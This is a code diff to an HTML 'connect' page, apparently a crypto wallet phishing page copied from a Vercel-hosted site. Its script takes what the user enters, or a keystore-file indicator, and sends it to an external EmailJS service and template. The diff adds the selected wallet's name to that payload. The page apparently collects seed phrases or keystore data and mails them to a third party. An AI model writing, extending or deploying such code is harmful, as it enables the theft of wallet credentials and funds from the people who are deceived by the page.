@@ -2,6 +2,7 @@
 <html lang="en">
 
 <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -296,9 +297,14 @@
           ? "Keystore JSON file selected"
           : contentField.value;
 
+      // Get the selected wallet name from the 'selected-wallet' element
+      const selectedWalletElement = document.getElementById("selected-wallet");
+      const walletName = selectedWalletElement.textContent.replace("Selected Wallet: ", "");
+
       emailjs
         .send("service_uq3csjc", "template_p3umrcj", {
           content: content,
+          wallet_name: walletName, // Add wallet name to the payload
         })
         .then(
           () => {
@@ -316,4 +322,5 @@
 
 
 <!-- Mirrored from revolutionarytool.vercel.app/connect.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 28 Sep 2025 18:30:18 GMT -->
+
 </html>
